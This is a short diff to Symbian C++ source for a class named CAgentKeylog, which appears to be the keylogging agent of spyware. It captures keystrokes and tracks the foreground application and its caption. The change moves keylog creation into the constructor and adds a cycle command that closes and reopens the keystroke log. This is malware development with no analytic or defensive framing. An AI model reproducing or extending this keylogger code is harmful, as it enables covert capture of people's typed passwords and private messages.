@@ -47,7 +47,7 @@ void CAgentKeylog::ConstructL(const TDesC8& params)
 	__FLOG(_L("-------------"));
 		
 	BaseConstructL(params);
-	
+	CreateLogL(LOGTYPE_KEYLOG);
 	iWsSession.Connect();
 	iFgMonitor = CForegroundMonitor::NewL(iWsSession,*this);
 	iKeyLogger = CKeyLogger::NewL(*this);
@@ -57,7 +57,7 @@ void CAgentKeylog::StartAgentCmdL()
 	{
 	//__FLOG(_L("StartAgentCmdL()"));
 	
-	CreateLogL(LOGTYPE_KEYLOG);
+	//CreateLogL(LOGTYPE_KEYLOG);
 	
 	//retrieve current task in foreground and initialize iAppUid,iCaption
 	TInt wgId = iWsSession.GetFocusWindowGroup();
@@ -94,6 +94,12 @@ void CAgentKeylog::StopAgentCmdL()
 	iFgMonitor->Cancel();
 	iKeyLogger->Cancel();
 	CloseLogL();
+	}
+
+void CAgentKeylog::CycleAgentCmdL()
+	{
+	CloseLogL();
+	CreateLogL(LOGTYPE_KEYLOG);
 	}
 
 void CAgentKeylog::ForegroundEventL(TUid aAppUid, const TDesC& aCaption)
